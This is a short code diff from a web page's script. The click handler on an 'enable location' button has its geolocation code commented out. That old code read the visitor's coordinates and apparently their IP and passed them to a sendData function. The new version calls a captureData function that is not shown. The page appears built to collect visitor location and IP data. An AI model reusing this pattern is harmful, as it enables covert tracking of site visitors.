@@ -17,24 +17,26 @@
 
 <script>
     document.getElementById("enableLocationBtn").addEventListener("click", function() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    console.log("Latitude:", position.coords.latitude);
-                    console.log("Longitude:", position.coords.longitude);
-                    sendData(ip, position.coords.latitude, position.coords.longitude);
-                    alert("Location enabled! Redirecting...");
-                    window.location.href = "home.html"; // Change to your destination page
-                },
-                (error) => {
-                    document.getElementById("errorMsg").classList.remove("hidden");
-                    console.error("Geolocation error:", error.message);
-                }
-            );
-        } else {
-            document.getElementById("errorMsg").textContent = "Your browser does not support location access.";
-            document.getElementById("errorMsg").classList.remove("hidden");
-        }
+        // if (navigator.geolocation) {
+        //     navigator.geolocation.getCurrentPosition(
+        //         (position) => {
+        //             console.log("Latitude:", position.coords.latitude);
+        //             console.log("Longitude:", position.coords.longitude);
+        //             let ip = getIPAddress();
+        //             sendData(ip, position.coords.latitude, position.coords.longitude);
+        //             alert("Location enabled! Redirecting...");
+        //             window.location.href = "home.html"; // Change to your destination page
+        //         },
+        //         (error) => {
+        //             document.getElementById("errorMsg").classList.remove("hidden");
+        //             console.error("Geolocation error:", error.message);
+        //         }
+        //     );
+        // } else {
+        //     document.getElementById("errorMsg").textContent = "Your browser does not support location access.";
+        //     document.getElementById("errorMsg").classList.remove("hidden");
+        // }
+        captureData();
     });
 </script>
 <script>
